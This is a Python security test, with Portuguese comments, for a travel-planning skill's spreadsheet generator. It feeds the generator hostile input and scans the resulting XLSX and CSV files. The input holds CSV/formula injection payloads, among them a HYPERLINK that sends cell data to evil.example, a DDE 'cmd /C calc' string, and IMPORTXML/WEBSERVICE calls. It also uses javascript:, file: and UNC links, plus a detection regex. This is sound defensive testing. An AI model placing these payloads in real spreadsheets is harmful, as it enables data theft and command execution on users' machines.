#!/usr/bin/env python3
"""Teste de segurança do scripts/gerar_planilha.py (skill consultor-de-viagens).

Simula dados vindos de sites maliciosos (texto que tenta virar fórmula, links perigosos,
números inválidos, caracteres de controle, tipos errados) e verifica as planilhas geradas.

Uso (na raiz do repositório):  python tests/teste_seguranca.py
Requer: openpyxl. Sai com código 1 se encontrar algum problema.
Criado por LOM Consultoria e Projetos · contato@lomconsultoria.com · Licença CC BY-NC 4.0
"""
import json, os, subprocess, sys, glob, csv, zipfile, re, tempfile
RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
S = os.path.join(RAIZ, "consultor-de-viagens", "scripts", "gerar_planilha.py")
os.chdir(tempfile.mkdtemp(prefix="seg-viagens-"))
P = ['=HYPERLINK("https://evil.example/?x="&A1,"clique")', "+cmd|' /C calc'!A0", "-2+3+EVIL()", "@SUM(1)+EVIL()",
     "\t=EVIL()", "\r=EVIL()", "\n=EVIL()", " =EVIL()", "＝EVIL()", "=IMPORTXML(\"https://evil.example\",\"//a\")",
     "=WEBSERVICE(\"https://evil.example\")", "=IMAGE(\"https://evil.example/p.png\")"]
LINKS = ["javascript:alert(1)", "file:///C:/Windows/System32/calc.exe", "data:text/html,<script>alert(1)</script>",
         "  https://evil.example", "HTTPS://evil.example/ok", "\\\\evil.example\\share", "ms-excel:ofe|u|https://evil.example/x.xlsx"]
def base(i):
    p = P[i % len(P)]
    return {"titulo": p, "consulta": p, "recomendacao": P, "riscos": P, "observacao_bagagem": p,
     "premissas": [{"chave": "passageiros", "rotulo": p, "valor": 2, "fonte": p},
                   {"chave": "diaria_extra_grupo", "rotulo": p, "valor": 500, "fonte": p, "formato": p}],
     "opcoes": [{"opcao": q, "recomendada": j == 0, "ida_data": q, "partida": q, "chegada": q, "trecho": q,
                 "companhia": q, "escalas": q, "volta": q, "ida_pix_pp": 100 + j, "ida_cartao_pp": q if j % 2 else 110,
                 "volta_pp": 50, "noites_extras": j % 3, "fonte_ida": q, "fonte_volta": q,
                 **({"veredito": q} if j == 3 else {})} for j, q in enumerate(P)]
              + [{"opcao": "multi", "trechos": [{"rota": q, "data": q, "horario": q, "companhia": q, "pix_pp": 10, "cartao_pp": 11, "fonte": q} for q in P]}],
     "fontes": [{"trecho": q, "voo": q, "fonte": q, "pix_pp": q, "cartao_pp": 10, "parcelamento": q, "tarifa": q,
                 "reputacao": q, "link": LINKS[k % len(LINKS)], "hora": q} for k, q in enumerate(P)],
     "pagamento": [{"canal": q, "desconto_pix": q, "parcelas_sem_juros": q, "parcela_minima": q, "juros": q,
                    "observacoes": q, "link": LINKS[k % len(LINKS)]} for k, q in enumerate(P)],
     "simulacao": [{"trecho": q, "forma": q, "base": q, "parcelas": q, "obs": q} for q in P],
     "lacunas": [{"item": q, "situacao": q, "como_conferir": LINKS[k % len(LINKS)] if k % 2 else q} for k, q in enumerate(P)]}
casos = {"injecao": base(0)}
c = base(1); c["premissas"][0]["valor"] = 0; casos["pax_zero"] = c
c = base(2); c["opcoes"][0]["ida_pix_pp"] = float("nan"); c["opcoes"][1]["ida_pix_pp"] = float("inf"); casos["nan_inf"] = c
c = base(3); c["titulo"] = "A" * 40000; casos["texto_gigante"] = c
c = base(4); c["recomendacao"] = ["controle \x00\x07\x1b fim"]; casos["controle"] = c
c = base(5); c["opcoes"][0]["opcao"] = {"x": 1}; c["recomendacao"] = "texto e não lista"; casos["tipos_errados"] = c
c = base(6); c["opcoes"][0]["noites_extras"] = "=EVIL()"; casos["noites_texto"] = c
os.makedirs("in", exist_ok=True); os.makedirs("out", exist_ok=True)
MARCAS = re.compile(r"EVIL|evil\.example|calc|SUM\(1\)|IMPORTXML|WEBSERVICE|IMAGE|HYPERLINK", re.I)
from openpyxl import load_workbook
achados = []
for nome, d in casos.items():
    fj = f"in/{nome}.json"; json.dump(d, open(fj, "w"), ensure_ascii=False)
    r = subprocess.run([sys.executable, S, fj, f"out/{nome}.xlsx", "--formato", "todos"], capture_output=True, text=True)
    status = "ok" if r.returncode == 0 else "FALHOU: " + (r.stderr.strip().splitlines() or ["?"])[-1][:160]
    print(f"[{nome}] {status}")
    for x in glob.glob(f"out/{nome}*.xlsx"):
        try:
            wb = load_workbook(x)
        except Exception as e:
            achados.append((nome, "xlsx ilegível", str(e)[:120])); continue
        for ws in wb:
            for row in ws.iter_rows():
                for cel in row:
                    if cel.data_type == "f" and MARCAS.search(str(cel.value)):
                        achados.append((nome, "FÓRMULA INJETADA", f"{ws.title}!{cel.coordinate} = {str(cel.value)[:70]}"))
                    if cel.hyperlink and not str(cel.hyperlink.target).lower().startswith(("http://", "https://")):
                        achados.append((nome, "LINK PERIGOSO", f"{ws.title}!{cel.coordinate} -> {cel.hyperlink.target}"))
                    if cel.number_format and MARCAS.search(str(cel.number_format)):
                        achados.append((nome, "FORMATO INJETADO", f"{ws.title}!{cel.coordinate} fmt={cel.number_format[:60]}"))
        z = zipfile.ZipFile(x)
        for n in z.namelist():
            t = z.read(n).decode("utf-8", "ignore")
            for m in re.finditer(r"<f>([^<]*)</f>", t):
                if MARCAS.search(m.group(1)):
                    achados.append((nome, "FÓRMULA NO XML", f"{n}: {m.group(1)[:60]}"))
    for f in glob.glob(f"out/{nome}*_csv/*.csv"):
        for linha in csv.reader(open(f, encoding="utf-8-sig"), delimiter=";"):
            for v in linha:
                if v[:1] in ("=", "+", "-", "@", "\t", "\r", "\n", "＝") and MARCAS.search(v):
                    achados.append((nome, "CSV INJETADO", f"{os.path.basename(f)}: {v[:60]!r}"))
                if v.lower().startswith(("javascript:", "file:", "data:", "ms-excel:", "\\\\")):
                    achados.append((nome, "LINK PERIGOSO CSV", f"{os.path.basename(f)}: {v[:60]}"))
print(f"\n{len(achados)} achados")
from collections import Counter
for (k, t), n in Counter((a[0], a[1]) for a in achados).items(): print(f"  {k}: {t} x{n}")
for a in achados[:25]: print("  ", a)
# Casos que devem ser recusados com mensagem clara
recusas = {"pax_zero": "passageiros"}
for nome, palavra in recusas.items():
    r = subprocess.run([sys.executable, S, f"in/{nome}.json", f"out/{nome}_r.xlsx"], capture_output=True, text=True)
    if r.returncode == 0 or palavra not in (r.stderr + r.stdout):
        achados.append((nome, "NÃO RECUSOU", "entrada inválida aceita"))
r = subprocess.run([sys.executable, S, "in/injecao.json", "../fora.xlsx"], capture_output=True, text=True)
if r.returncode == 0:
    achados.append(("caminho", "ACEITOU '..'", "saída fora da pasta"))
falhas = [n for n in casos if n not in recusas and not glob.glob(f"out/{n}*.xlsx")]
for n in falhas:
    achados.append((n, "SCRIPT QUEBROU", "entrada maliciosa derrubou a geração"))
print("RESULTADO:", "aprovado" if not achados else f"{len(achados)} problema(s)")
sys.exit(1 if achados else 0)
